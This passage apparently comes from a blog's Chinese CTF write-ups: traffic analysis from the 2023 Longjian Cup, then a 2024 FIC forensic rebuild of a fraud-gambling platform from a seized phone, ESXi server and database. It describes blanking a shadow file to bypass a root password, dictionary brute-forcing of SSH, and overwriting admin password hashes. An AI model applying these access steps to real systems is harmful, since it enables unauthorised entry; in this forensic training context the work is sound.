src="/img/blogimg/1706702934817-d45d1558-817d-416a-9510-24dfdf33e40d.png"></p><blockquote><p>服务器的内网IP是多少？<br>192.168.101.132</p></blockquote><p><img src="/img/blogimg/1706702943361-1652ce9e-baf5-4081-b0dc-77951dd500b6.png"></p><blockquote><p>攻击者往服务器中写入的key是什么？<br>7d9ddff2-2d67-4eba-9e48-b91c26c42337</p></blockquote><p><img src="/img/blogimg/1706702952034-38bf593d-97df-493b-8bd0-d3a178786ca9.png"></p><p><img src="/img/blogimg/1706702957565-9765a518-f267-4d8f-9ef5-3b557a02bcb5.png"></p><p>是一个压缩包</p><p><img src="/img/blogimg/1706702974564-a746e058-cf60-43d7-a9a2-f7510acc86ab.png"></p><p>提取压缩包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> UEsDBBQAAQAAANgDvlTRoSUSMAAAACQAAAAHAAAAa2V5LnR4dGYJZVtgRzdJtOnW1ycl/O/AJ0rmzwNXxqbCRUq2LQid0gO2yXaPBcc9baLIAwnQ71BLAQI/ABQAAQAAANgDvlTRoSUSMAAAACQAAAAHACQAAAAAAAAAIAAAAAAAAABrZXkudHh0CgAgAAAAAAABABgAOg7Zcnlz2AE6DtlyeXPYAfldXhh5c9gBUEsFBgAAAAABAAEAWQAAAFUAAAAAAA== | <span class="hljs-built_in">base64</span> -d &gt; a.zip<br></code></pre></td></tr></table></figure><p>结合前面的密码</p><p><img src="/img/blogimg/1706702994529-9830f75f-7b7f-4ef0-ae9f-7ae38b8bf1b4.png"></p><p><img src="/img/blogimg/1706702999654-0f01fa01-42cf-4599-a669-b88426924dab.png"></p><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><blockquote><p>攻击者通过暴力破解进入了某Wiki 文档，请给出登录的用户名与密码，以:拼接，比如admin:admin<br>TMjpxFGQwD:123457</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http &amp;&amp; !http.request.uri contains &quot;login&quot; &amp;&amp; !tcp contains &quot;用户名或密码错误&quot; &amp;&amp; http.response.code !=404<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/1706703144845-1483be00-b33e-4a6e-b5c1-f857dc9e49cd.png"></p><blockquote><p>攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（32位小写）<br>383c74db4e32513daaa1eeb1726d7255</p></blockquote><p>成功之后的Cookie有<code>accessToken</code>特征，所以搜<code>accessToken</code>，<code>http contains &quot;accessToken&quot;</code></p><p><img src="/img/blogimg/1706703154714-67ec0da2-6acb-444d-8558-cb383c1d2a1a.png"></p><p><img src="/img/blogimg/1706703175025-b0fc873b-b1e2-4113-a11c-00ef50f58d6e.png"></p><blockquote><p>攻击使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接，比如root:123456<br>zyplayer:1234567</p></blockquote><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">tcp <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;jdbc:&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/1706703197592-7d959f7e-4ab3-485d-b190-8a8f634915d6.png"></p><blockquote><p>攻击者又使用了CVE漏洞攻击应用，执行系统命令，请给出此CVE编号以及远程EXP的文件名，使用:拼接，比如CVE-2020-19817:exp.so<br>CVE-2022-21724:custom.dtd.xml</p></blockquote><p><img src="/img/blogimg/1706703204743-8148a087-7d28-4109-ba6e-babebcc2f383.png"></p><p>复现的文章里面上传了一个xml文件，搜索xml</p><p><img src="/img/blogimg/1706703210817-ada8bc00-c5e1-422b-a882-020d33a4f28f.png"></p><blockquote><p>给出攻击者获取系统权限后，下载的工具的名称，比如nmap<br>fscan</p></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.port <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/1706703225661-023e8bc8-6ada-4a8c-957d-27f1837be577.png"></p><h3 id="hacked"><a href="#hacked" class="headerlink" title="hacked"></a>hacked</h3><blockquote><p>admIn用户的密码是什么？<br>flag{WelC0m5_TO_H3re}</p></blockquote><p>比较前面的数据包可以发现key和iv</p><p><img src="/img/blogimg/1706703244498-19ec00df-bdab-4316-b5ce-90ca52d7bcb0.png"></p><p><img src="/img/blogimg/1706703252303-8b339ef9-732e-44f0-9968-19c57f1ac293.png"></p><blockquote><p>app.config[‘SECRET_KEY’]值为多少？<br>ssti_flask_hsfvaldb</p></blockquote><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">tcp <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;KEY&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/1706703259335-89e9d386-0df3-4200-b6da-9451f6a05450.png"></p><blockquote><p>flask网站由哪个用户启动？<br>red</p></blockquote><p>通过session进行的rce</p><p><img src="/img/blogimg/1706703275522-526b7853-41ec-474d-bb5a-f3b31eb1cca7.png"></p><blockquote><p>攻击者写入的内存马的路由名叫什么？（答案里不需要加&#x2F;）<br>Index</p></blockquote><p>翻来翻去只有Index这个路由比较可疑，拿去解密之后也证实是这个路由</p><p><img src="/img/blogimg/1706703281489-091416f8-08e8-478d-90d2-b883921a4170.png"></p>]]></content>
    
    
    <summary type="html">2023陇剑杯比赛记录+复盘</summary>
    
    
    
    <category term="CTF" scheme="https://cvbxy.github.io/categories/CTF/"/>
    
    
    <category term="取证" scheme="https://cvbxy.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
    <category term="流量分析" scheme="https://cvbxy.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第四届FIC取证竞赛</title>
    <link href="https://cvbxy.github.io/2024/06/19/FIC/"/>
    <id>https://cvbxy.github.io/2024/06/19/FIC/</id>
    <published>2024-06-19T05:59:11.000Z</published>
    <updated>2024-06-19T13:10:15.824Z</updated>
    
    <content type="html"><![CDATA[<p>案情简介：<br>2024年4月，卢某报案至警方，声称自己疑似遭受了“杀猪盘”诈骗，大量钱财被骗走。卢某透露，在与某公司交流过程中结识了员工李某。李某私下诱导卢某参与赌博游戏，起初资金出入均属正常。但随后，李某称赌博平台为提升安全性，更换了地址和玩法，转为通过群聊抢红包形式进行赌博。随着赌资不断增加，卢某投入巨额资金后，发现无法再访问该网站，同时李某也失去联系，卢某遂意识到自己被骗。在经济压力下，卢某选择报警，并承认参与赌博活动，愿意承担相应法律后果。警方依据卢某提供的线索和手机数据，迅速锁定犯罪团伙，并在一藏匿地点成功抓获犯罪嫌疑人李某和赵某。警方对嫌疑人持有的物品进行了证据固定：李某手机被标记为检材1，窝点内服务器为检材2，赵某使用的计算机为检材3。<br>接下来，请取证工作者根据案情和这些检材进行深入分析，并解答后续问题。</p><h1 id="手机部分"><a href="#手机部分" class="headerlink" title="手机部分"></a>手机部分</h1><blockquote><p>嫌疑人李某的手机型号是？<br>A. Xiaomi MI 2s<br>B. Xiaomi MI 4<br>C. Xiaomi MI 6<br>D. Xiaomi MI 8</p><p>B</p></blockquote><p><img src="/img/blogimg/2024061909393112.png"></p><p><code>/data/system/users/0/settings_global.xml</code></p><p><img src="/img/blogimg/2024061909393114.png"></p><blockquote><p>嫌疑人李某是否可能有平板电脑设备，如有该设备型号是？<br>A. iPad Pro 11<br>B. Vivo Pad 2<br>C. MatePad Pro<br>D. Xiaomi Pad 6s</p><p>D</p></blockquote><p><img src="/img/blogimg/2024061909393223.png"></p><p><code>/data/misc/wifi/WifiConfigStore.xml</code></p><p><img src="/img/blogimg/2024061909393225.png"></p><blockquote><p>嫌疑人李某手机开启热点设置的密码是?【答题格式：abc123】<br>5aada11bc1b5</p></blockquote><p><img src="/img/blogimg/2024061909393229.png"></p><p><code>/data/misc/wifi/softap.conf</code></p><p><img src="/img/blogimg/2024061909393331.png"></p><blockquote><p>嫌疑人李某的微信内部ID是？【答题格式：wxid_abc123】<br>wxid_wnigmud8aj6j12</p></blockquote><p><img src="/img/blogimg/2024061909393335.png"></p><p>在<code>/data/com.tencent.mm/shared_prefs/auth_info_key_prefs.xml</code>中找到<code>_auth_uin</code>的值</p><p><img src="/img/blogimg/2024061909393337.png"></p><p><img src="/img/blogimg/2024061909393438.png"></p><p>微信的本地数据库存放在<code>/data/data/com.tencent.mm/MicroMsg</code>里面的一长串字符串的目录里面，导出这个数据库文件</p><p><img src="/img/blogimg/2024061909393440.png"></p><p><img src="/img/blogimg/2024061909393441.png"></p><blockquote><p>嫌疑人李某发送给技术人员的网站源码下载地址是什么 【答题格式：<a href="http://www.baidu.com/adc%E3%80%91">http://www.baidu.com/adc】</a><br><a href="http://www.honglian7001.com/down">http://www.honglian7001.com/down</a></p></blockquote><p>和赵老五的聊天记录中提到了网站代码，扫一扫</p><p><img src="/img/blogimg/2024061909393446.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">新佛曰：諸隸僧殿降吽諸陀摩隸殿僧殿缽殿薩願僧殿宣摩殿嚴願殿是迦咒叻吶嚤須塞亦須阿隸嚤須愍眾殿蜜殿隸願蜜哆蜜亦願是念慧殿隸摩哆殿即隸嚤訶須隸亦愍如如殿囑殿囑<br></code></pre></td></tr></table></figure><p>在线解密：<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p><p><img src="/img/blogimg/2024061909393551.png"></p><p>DB Browser查看解密后的数据库文件</p><p><img src="/img/blogimg/2024061909393553.png"></p><p><img src="/img/blogimg/2024061909393554.png"></p><p>后面的步骤和上面一样</p><blockquote><p>受害者微信用户ID是？【答题格式：abc123】<br>limoon890</p></blockquote><p>limoon被骗5000，查看他的ID</p><p><img src="/img/blogimg/2024061909393660.png"></p><p><img src="/img/blogimg/2024061909393760.png"></p><p><img src="/img/blogimg/2024061909393661.png"></p><p><img src="/img/blogimg/2024061909393662.png"></p><blockquote><p>嫌疑人李某第一次连接WIFI的时间是？<br>A. 03-14 15:55:57<br>B. 03-14 16:55:57<br>C. 03-14 17:55:57<br>D. 03-14 18:55:57</p><p>B</p></blockquote><p><code>/data/misc/wifi/WifiConfigStore.xml</code></p><p><img src="/img/blogimg/2024061909393770.png"></p><blockquote><p>分析嫌疑人李某的社交习惯，哪一个时间段消息收发最活跃？<br>A. 12:00-14:00<br>B. 14:00-16:00<br>C. 16:00-18:00<br>D. 18:00-20:00</p><p>C</p></blockquote><p>火眼看聊天记录，大部分记录都在16:00-18:00</p><p>看数据库的create time，转换一下时间戳</p><p><img src="/img/blogimg/2024061909393779.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_time</span>(<span class="hljs-params">timestamp</span>):<br>    dt = datetime.datetime.fromtimestamp(timestamp//<span class="hljs-number">1000</span>)<br>    format_time = dt.strftime(<span class="hljs-string">&#x27;%Y年%m月%d日%H时%M分%S秒&#x27;</span>)<br>    <span class="hljs-keyword">return</span> format_time<br><br>conn = sqlite3.connect(<span class="hljs-string">&#x27;./EnMicroMsg_dec.db&#x27;</span>)<br>cursor = conn.cursor()<br>sql = <span class="hljs-string">&#x27;select createTime from message&#x27;</span><br>cursor.execute(sql)<br>data = cursor.fetchall()<br>cnt = &#123;&#125;<br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;日(.*?)时&#x27;</span>)<br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> data:<br>    createTime = re.findall(pattern,get_time(v[<span class="hljs-number">0</span>]))[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> createTime <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cnt.keys():<br>        cnt[createTime] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        cnt[createTime] += <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(cnt)<br><br><span class="hljs-comment"># &#123;&#x27;16&#x27;: 52, &#x27;17&#x27;: 55, &#x27;15&#x27;: 3, &#x27;18&#x27;: 10, &#x27;13&#x27;: 17, &#x27;14&#x27;: 12, &#x27;20&#x27;: 23&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>请分析嫌疑人手机，该案件团伙中，还有一名重要参与者警方未抓获，该嫌疑人所使用的微信账号ID为？【答题格式：wxid_abc123】<br>wxid_kolc5oaiap6z22</p></blockquote><p>对比聊天记录和案情简介，还有一个叫老苏的</p><p><img src="/img/blogimg/20240619093937111.png"></p><p><img src="/img/blogimg/20240619093937112.png"></p><p><img src="/img/blogimg/20240619093938113.png"></p><blockquote><p>请分析嫌疑人手机，嫌疑人老板组织人员参与赌博活动，所使用的国内访问入口地址为？【答题格式：192.168.1.1:1000&#x2F;abc】<br>192.168.110.110:8000&#x2F;login</p></blockquote><p><img src="/img/blogimg/20240619093938117.png"></p><p><img src="/img/blogimg/20240619093938118.png"></p><h1 id="服务器集群题"><a href="#服务器集群题" class="headerlink" title="服务器集群题"></a>服务器集群题</h1><p>挂载镜像，用低版本的ftk挂载，别的会出问题</p><p><img src="/img/blogimg/20240619093938121.png"></p><p><img src="/img/blogimg/20240619093939122.png"></p><p>手工绕密：</p><p>打开FTK挂载出来的虚拟磁盘，在250MB大小的一个分区找到STATE.TGZ文件，7z逐层解压，直接在目录中点击编辑即可修改shadow文件，置空后保存即可</p><p><img src="/img/blogimg/20240619093939125.png"></p><p><img src="/img/blogimg/20240619093939126.png"></p><blockquote><p>esxi服务器的esxi版本为？【关键字得分，答题格式：1.2】<br>6.7</p></blockquote><p>火眼识别</p><p><img src="/img/blogimg/20240619093939131.png"></p><p>管理员权限打开VMware进行仿真</p><p><img src="/img/blogimg/20240619093940133.png"></p><p><img src="/img/blogimg/20240619093940134.png"></p><blockquote><p>请分析ESXi服务器，该系统的安装日期为：<br>2024 年 3 月 12 日 星期二 02:04:15 UTC<br>2024 年 3 月 12 日 星期二 02:05:15 UTC<br>2024 年 3 月 12 日 星期二 02:06:15 UTC<br>2024 年 3 月 12 日 星期二 02:07:15 UTC</p><p>A</p></blockquote><p>配置网卡进入esxi</p><p><img src="/img/blogimg/20240619093940142.png"></p><p><img src="/img/blogimg/20240619093940143.png"></p><p><img src="/img/blogimg/20240619093941144.png"></p><p><img src="/img/blogimg/20240619093941145.png"></p><p><img src="/img/blogimg/20240619093942145.png"></p><p><img src="/img/blogimg/20240619093941146.png"></p><p><img src="/img/blogimg/20240619093942147.png"></p><p>弄好网卡记得虚拟化，不然等会开里面的虚拟机还得重启然后虚拟化，得重新挂载数据(火眼仿真会丢失数据盘，赛后已修复)</p><p><img src="/img/blogimg/20240619093942149.png"></p><p><img src="/img/blogimg/20240619093942150.png"></p><p>root加空密码就能进</p><p><img src="/img/blogimg/20240619093942152.png"></p><blockquote><p>请分析ESXi服务器数据存储“datastore”的UUID是？【答题格式：a1a1-b1b1-c1c1-d1d1】<br>65efb8a8-ddd817f6-04ff-000c297bd0e6</p></blockquote><p>没有存储，但是有设备，可能是丢失了数据，需要重新挂载</p><p><a href="https://mp.weixin.qq.com/s/1rFGJnYw59DfId8fWKTGdA">https://mp.weixin.qq.com/s/1rFGJnYw59DfId8fWKTGdA</a></p><p><img src="/img/blogimg/20240619093943158.png"></p><p><img src="/img/blogimg/20240619093943159.png"></p><p>ssh直接连接，root加空密码，如何重新挂载一下数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost:~] esxcfg-volume -l<br>Scanning <span class="hljs-keyword">for</span> VMFS-6 host activity (4096 bytes/HB, 1024 HBs).<br>VMFS UUID/label: 65efb8a8-ddd817f6-04ff-000c297bd0e6/datastore1<br>Can mount: Yes<br>Can resignature: Yes<br>Extent name: t10.ATA_____VMware_Virtual_IDE_Hard_Drive___________00000000000000000001:3 range: 0 - 197119 (MB)<br><br>[root@localhost:~] esxcfg-volume -m 65efb8a8-ddd817f6-04ff-000c297bd0e6<br>Mounting volume 65efb8a8-ddd817f6-04ff-000c297bd0e6<br>[root@localhost:~] <br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619093943173.png"></p><p>回到网页刷新一下就好了</p><p><img src="/img/blogimg/20240619093944175.png"></p><blockquote><p>ESXI服务器的原IP地址？【答题格式：255.255.255.0】<br>192.168.8.112</p></blockquote><p><img src="/img/blogimg/20240619093944179.png"></p><blockquote><p>EXSI服务器中共创建了几个虚拟机？【答题格式：1】<br>4</p></blockquote><p>（其实有5个，有一个是坏的，可能火眼仿真没有加载）</p><p><img src="/img/blogimg/20240619093944184.png"></p><p><img src="/img/blogimg/20240619093945185.png"></p><blockquote><p>网站服务器绑定的IP地址为？【答题格式：255.255.255.0】<br>192.168.8.89</p></blockquote><p><img src="/img/blogimg/20240619093945189.png"></p><p>把esxi里面的虚拟机全部开开</p><p><img src="/img/blogimg/20240619093945191.png"></p><p>查看www的网络信息（可能得等一会），访问该ip</p><p><img src="/img/blogimg/20240619093946193.png"></p><p><img src="/img/blogimg/20240619093946194.png"></p><blockquote><p>网站服务器的登录密码为？【答题格式：abc123】<br>qqqqqq</p></blockquote><p>用Windows镜像里面的字典爆破一下www的密码</p><p><img src="/img/blogimg/20240619093947199.png"></p><blockquote><p>网站服务器所使用的管理面板登陆入口地址对应的端口号为：【答案格式：1111】<br>14131</p></blockquote><p>ssh连接www，www的www目录下面有宝塔相关的东西，猜测可能是宝塔面板搭建的，输入bt测一下</p><p><img src="/img/blogimg/20240619093947204.png"></p><p><img src="/img/blogimg/20240619093947205.png"></p><p>查看bt默认信息</p><p><img src="/img/blogimg/20240619093948207.png"></p><blockquote><p>网站服务器的web目录是？【答题格式：&#x2F;etc】<br>&#x2F;webapp</p></blockquote><p>改掉bt面板的密码，然后登录bt面板</p><p><img src="/img/blogimg/20240619093948212.png"></p><p>宝塔面板里面的网站里面没有东西，但是&#x2F;webapp目录下有源码，所有应该是&#x2F;webapp</p><p><img src="/img/blogimg/20240619093948214.png"></p><p><img src="/img/blogimg/640-1718775390765-3.png" alt="1"></p><blockquote><p>网站配置中Redis的连接超时时间为多少秒 【答题格式：20】<br>10</p></blockquote><p><img src="/img/blogimg/20240619093949218.png"></p><blockquote><p>网站普通用户密码中使用的盐值为 【答题格式：123abc!@#】<br>!@#qaaxcfvghhjllj788+)_)((</p></blockquote><p><img src="/img/blogimg/20240619093949222.png"></p><p>UserController中有调用加密函数，查看这个函数</p><p><img src="/img/blogimg/20240619093949224.png"></p><p>可知第二个参数就是salt</p><p><img src="/img/blogimg/20240619093949226.png"></p><blockquote><p>网站管理员用户密码的加密算法名称是什么<br>A.des<br>B.rsa<br>C.md5<br>D.bcrypt</p><p>D</p></blockquote><p>ruoyi的管理员密码生成类在<code>com.ruoyi.common.utils.SecurityUtils</code></p><p><img src="/img/blogimg/20240619093950234.png"></p><blockquote><p>网站超级管理员用户账号创建的时间是？<br>A.2022-05-09 12:44:41<br>B.2022-05-09 13:44:41<br>C.2022-05-09 14:44:41<br>D.2022-05-09 15:44:41</p><p>C</p></blockquote><p>访问网站会报接口异常</p><p><img src="/img/blogimg/20240619093950242.png"></p><p>看jar包中的数据库用的本地的，但是本地无法登录数据库</p><p><img src="/img/blogimg/20240619093950244.png"></p><p><img src="/img/blogimg/20240619093951245.png"></p><p>宝塔面板显示数据库的地址是192.168.8.142，对应名为data的虚拟机</p><p><img src="/img/blogimg/20240619093951247.png"></p><p>爆破ssh，然后连接</p><p><img src="/img/blogimg/20240619093951249.png"></p><p>发现没有mysql</p><p><img src="/img/blogimg/20240619093951251.png"></p><p>结合后面的题目，应该是有docker，启动docker</p><p><img src="/img/blogimg/20240619093952253.png"></p><p>启动mysql</p><p><img src="/img/blogimg/20240619093952255.png"></p><p>连一下数据库</p><p><img src="/img/blogimg/20240619093952257.png"></p><p><img src="/img/blogimg/20240619093953258.png"></p><blockquote><p>重构进入网站之后，用户管理下的用户列表页面默认有多少页数据 【答题格式：20】<br>877</p></blockquote><p>在www虚拟机中提取出ruoyi-admin.jar的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar xf ruoyi-admin.jar BOOT-INF/classes/application-druid.yml<br></code></pre></td></tr></table></figure><p>使用vim命令修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim BOOT-INF/classes/application-druid.yml<br></code></pre></td></tr></table></figure><p>将数据库地址修改为data虚拟机的ip，密码修改成宝塔面板中的密码</p><p><img src="/img/blogimg/20240619093953271.png"></p><p>更新配置文件到jar包内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar uf ruoyi-admin.jar BOOT-INF/classes/application-druid.yml<br></code></pre></td></tr></table></figure><p>查看修改时间，时间变了即为修改成功</p><p><img src="/img/blogimg/20240619093953277.png"></p><p>运行restart.sh</p><p><img src="/img/blogimg/20240619093954279.png"></p><p>还是502异常，参考运维笔记，修改一下redis的配置文件</p><p><img src="/img/blogimg/20240619093954281.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost webapp]<span class="hljs-comment"># jar xf ruoyi-admin.jar BOOT-INF/classes/application.yml</span><br>[root@localhost webapp]<span class="hljs-comment"># vim BOOT-INF/classes/application.yml</span><br>[root@localhost webapp]<span class="hljs-comment"># jar uf ruoyi-admin.jar BOOT-INF/classes/application.yml</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619093954287.png"></p><p>定时任务插件执行时间问题在sys_job表中，将下面的在2023年和2024 年的每个1月1日执行任务替换成上面的在每小时的每隔两分钟触发一次，直到任务被停止或调度器关闭为止</p><p><img src="/img/blogimg/20240619093954289.png"></p><p><img src="/img/blogimg/20240619093955290.png"></p><p>启动后端</p><p><img src="/img/blogimg/20240619093955292.png"></p><p><img src="/img/blogimg/20240619093955293.png"></p><p>没有报错，可以正常访问了</p><p>使用<a href="https://www.bejson.com/encrypt/bcrpyt_encode/%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E5%AF%86%E7%A0%81%EF%BC%8C%E6%9B%BF%E6%8D%A2%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84sys_user%E8%A1%A8%E4%B8%AD">https://www.bejson.com/encrypt/bcrpyt_encode/生成一个密码，替换到数据库中的sys_user表中</a></p><p><img src="/img/blogimg/20240619093955296.png"></p><p><img src="/img/blogimg/20240619093956297.png"></p><p>正常登录，一共877页</p><p><img src="/img/blogimg/20240619093956299.png"></p><blockquote><p>该网站的系统接口文档版本号为 【答题格式：1.1.1】<br>3.8.2</p></blockquote><p><img src="/img/blogimg/20240619093956303.png"></p><blockquote><p>该网站获取订单列表的接口 【答题格式：&#x2F;abc&#x2F;abc】<br>&#x2F;api&#x2F;shopOrder</p></blockquote><p><img src="/img/blogimg/20240619093957307.png"></p><blockquote><p>受害人卢某的用户ID 【答题格式：11223344】<br>10044888</p></blockquote><p><img src="/img/blogimg/20240619093957311.png"></p><p><img src="/img/blogimg/20240619093957312.png"></p><blockquote><p>受害人卢某一共充值了多少钱 【答题格式：123456】<br>465222</p></blockquote><p><img src="/img/blogimg/20240619093957316.png"></p><blockquote><p>网站设置的单次抽奖价格为多少元 【答题格式：20】<br>10</p></blockquote><p><img src="/img/blogimg/20240619093958320.png"></p><blockquote><p>网站显示的总余额数是 【答题格式：20.12】<br>7354468.56</p></blockquote><p><img src="/img/blogimg/20240619093958324.png"></p><blockquote><p>网站数据库的root密码 【答题格式：abc123】<br>my-secret-pw</p></blockquote><p>查看容器的元数据</p><p><img src="/img/blogimg/20240619093958329.png"></p><p>navicat测试连接</p><p><img src="/img/blogimg/20240619093959331.png"></p><blockquote><p>数据库服务器的操作系统版本是 【答题格式：1.2.1234】<br>7.9.2009</p></blockquote><p><img src="/img/blogimg/20240619093959335.png"></p><blockquote><p>数据库服务器的Docker Server版本是 【答题格式：1.10.0】<br>1.13.1</p></blockquote><p><img src="/img/blogimg/20240619093959339.png"></p><blockquote><p>数据库服务器中数据库容器的完整ID是 【答题格式：123abcd】<br>9bf1cecec3957a5cd23c24c0915b7d3dd9be5238322ca5646e3d9e708371b765</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># docker ps -a --no-trunc</span><br>CONTAINER ID                                                       IMAGE               COMMAND                         CREATED             STATUS              PORTS                    NAMES<br>9bf1cecec3957a5cd23c24c0915b7d3dd9be5238322ca5646e3d9e708371b765   eclipse/mysql       <span class="hljs-string">&quot;docker-entrypoint.sh mysqld&quot;</span>   6 weeks ago         Up 36 minutes       0.0.0.0:3306-&gt;3306/tcp   mysql<br></code></pre></td></tr></table></figure><p>或者<code>docker inspect 9</code></p><blockquote><p>数据库服务器中数据库容器使用的镜像ID 【答题格式：123abcd】<br>66c0e7ca4921</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># docker images -a --no-trunc</span><br>REPOSITORY                TAG                 IMAGE ID                                                                  CREATED             SIZE<br>docker.io/eclipse/mysql   latest              sha256:66c0e7ca4921e941cbdbda9e92242f07fe37c2bcbbaac4af701b4934dfc41d8a   6 years ago         436 MB<br>[root@localhost ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><blockquote><p>数据库服务器中数据库容器创建的北京时间<br>A.2024&#x2F;3&#x2F;13  12:15:23<br>B.2024&#x2F;3&#x2F;13  20:15:23<br>C.2024&#x2F;3&#x2F;14  00:15:23<br>D.2024&#x2F;3&#x2F;13  08:15:23</p><p>B</p></blockquote><p><img src="/img/blogimg/20240619093959364.png"></p><p>在 Docker 中运行的 MySQL 容器默认使用的是世界标准时间（UTC)需要+8</p><blockquote><p>数据库服务器中数据库容器的ip是 【答题格式：255.255.255.0】<br>172.17.0.2</p></blockquote><p><img src="/img/blogimg/20240619094000369.png"></p><blockquote><p>分析数据库数据，在该平台邀请用户进群最多的用户的登录IP是 【答题格式：255.255.255.0】<br>223.104.51.34</p></blockquote><p>邀请进群相关数据在app_group_apply表，筛选一下邀请人数最多的inviter_id</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> inviter_id <span class="hljs-keyword">AS</span> 邀请人ID,<span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> 邀请人数 <span class="hljs-keyword">FROM</span> `app_group_apply` <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> inviter_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> 邀请人数 <span class="hljs-keyword">DESC</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094000377.png"></p><p>到app_user_info表找到对应用户的登录IP</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> login_ip <span class="hljs-keyword">FROM</span> `app_user_info` <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">53576061</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/20240619094000382.png"></p><blockquote><p>分析数据库数据，在该平台抢得最多红包金额的用户的登录IP是 【答题格式：255.255.255.0】<br>116.62.104.130</p></blockquote><p>抢红包记录在app_group_redpacket_member表中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">SUM</span>(money) <span class="hljs-keyword">AS</span> 总金额<br><span class="hljs-keyword">FROM</span> 